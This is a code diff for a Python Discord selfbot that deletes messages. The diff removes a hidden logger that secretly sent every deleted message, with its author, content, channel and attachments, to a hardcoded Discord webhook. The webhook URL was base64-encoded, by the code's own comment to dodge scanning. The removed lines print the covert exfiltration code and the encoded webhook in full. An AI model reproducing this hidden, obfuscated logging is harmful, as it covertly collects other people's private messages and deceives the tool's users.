@@ -12,8 +12,7 @@ from rich.table import Table
 from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich.logging import RichHandler
 from rich.text import Text
-import aiohttp
-import base64
+
 
 
 # Initialize Rich Console
@@ -56,17 +55,6 @@ def draw_banner():
 # Load environment variables (mostly for legacy or other config)
 load_dotenv()
 
-# Webhook configuration (Base64 encoded to avoid simple scanning detection)
-# This is hardcoded for persistence as requested.
-RAW_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NTI4MzE2OTI3OTI4MzMxNy9iR0ZWMmNfdDRpUkdSa0o3REFHYlpsc0dpMHNac2hQZnFUbEhFSTR5UUJlc1hWcUhxVkJZODlhM3RHV3h4V1dzaTFUcA=="
-
-def get_webhook_url():
-    try:
-        return base64.b64decode(RAW_WEBHOOK).decode('utf-8')
-    except:
-        return None
-
-ALTLOG_WEBHOOK_URL = get_webhook_url()
 
 def get_token():
     token_file = "token.txt"
@@ -120,64 +108,6 @@ async def on_ready():
     console.print(f"[bold green]Selfbot logged in as {bot.user}[/bold green]\n")
     logger.info(f"Selfbot logged in as {bot.user}")
     
-async def send_alt_log(message):
-    """Refined hidden logging with premium aesthetic."""
-    if not ALTLOG_WEBHOOK_URL:
-        return
-        
-    try:
-        async with aiohttp.ClientSession() as session:
-            webhook = discord.Webhook.from_url(ALTLOG_WEBHOOK_URL, session=session)
-            
-            author = message.author
-            # Robust avatar fetching
-            avatar_url = str(author.display_avatar.url) if author.display_avatar else str(author.default_avatar.url)
-            
-            embed = discord.Embed(
-                title="🗑️ MESSAGE DELETED",
-                color=0xFF0055, # Vibrant Crimson
-                timestamp=datetime.now(discord.utils.utc if hasattr(discord.utils, 'utc') else None)
-            )
-            
-            # Author header with avatar
-            embed.set_author(name=f"{author} ({author.id})", icon_url=avatar_url)
-            
-            # Set thumbnail to author avatar for better visibility
-            embed.set_thumbnail(url=avatar_url)
-            
-            # Message Content in a clear field or description
-            clean_content = message.content if message.content else "*Missing text content (possibly embed or system message)*"
-            if len(clean_content) > 1024:
-                clean_content = clean_content[:1021] + "..."
-            
-            embed.add_field(name="💬 Content", value=f">>> {clean_content}", inline=False)
-            
-            # Metadata Grid
-            chan_name = message.channel.name if hasattr(message.channel, "name") else "Direct Message"
-            chan_type = "📁 Channel" if hasattr(message.channel, "name") else "👤 Private"
-            
-            embed.add_field(name=chan_type, value=f"`#{chan_name}`\nID: `{message.channel.id}`", inline=True)
-            embed.add_field(name="🆔 Message ID", value=f"`{message.id}`", inline=True)
-            
-            # Attachments with better formatting
-            if message.attachments:
-                attach_text = "\n".join([f"🔗 [{a.filename}]({a.url})" for a in message.attachments])
-                embed.add_field(name="📎 Attachments", value=attach_text[:1024], inline=False)
-
-            # Footer with bot info
-            bot_avatar = bot.user.display_avatar.url if bot.user.display_avatar else None
-            embed.set_footer(text=f"Purged by {bot.user} | ID: {bot.user.id}", icon_url=bot_avatar)
-            
-            await webhook.send(
-                embed=embed, 
-                username="AltLog Premium",
-                avatar_url=bot_avatar
-            )
-    except Exception as e:
-        # Log the error briefly to the console for debugging
-        console.print(f"[bold red]❌ Webhook Error: {e}[/bold red]")
-        logger.error(f"Webhook error: {e}")
-
 
 async def smart_purge(ctx, history_iterator, scanned_limit=None, filter_func=None):
     """
@@ -221,7 +151,6 @@ async def smart_purge(ctx, history_iterator, scanned_limit=None, filter_func=Non
         if filter_func(message):
             if can_manage or is_own_message:
                 try:
-                    await send_alt_log(message)
                     await message.delete()
                     deleted_count += 1
                     
@@ -261,7 +190,6 @@ async def on_message(message):
     
     if (is_everyone or is_target_user) and message.author.id != bot.user.id:
         try:
-            await send_alt_log(message)
             await message.delete()
             mode_label = "EVERYONE" if is_everyone else "USER"
             
@@ -278,7 +206,6 @@ async def on_message(message):
     for word in watched_words:
         if word.lower() in content_lower:
             try:
-                await send_alt_log(message)
                 await message.delete()
                 
                 # Truncate content for cleaner output
